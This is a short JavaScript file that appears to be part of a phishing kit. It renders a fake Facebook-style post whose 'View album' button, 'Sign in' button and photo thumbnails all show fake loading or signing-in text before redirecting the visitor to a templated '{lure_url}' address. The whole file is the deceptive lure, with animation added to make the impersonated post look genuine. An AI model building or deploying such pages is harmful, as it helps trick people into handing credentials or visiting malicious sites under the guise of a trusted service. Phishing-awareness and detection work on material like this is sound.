function viewAlbum() {
    const btn = document.querySelector('.btn-view-album');
    btn.innerHTML = '<span>Loading...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1200);
}

function signIn() {
    const btn = document.querySelector('.btn-signin-fb');
    btn.innerHTML = '<span>Signing in...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.querySelectorAll('.photo-placeholder').forEach(photo => {
    photo.addEventListener('click', () => {
        window.location.href = '{lure_url}';
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const post = document.querySelector('.fb-post');
    post.style.opacity = '0';
    post.style.transform = 'translateY(10px)';
    
    setTimeout(() => {
        post.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
        post.style.opacity = '1';
        post.style.transform = 'translateY(0)';
    }, 100);
});
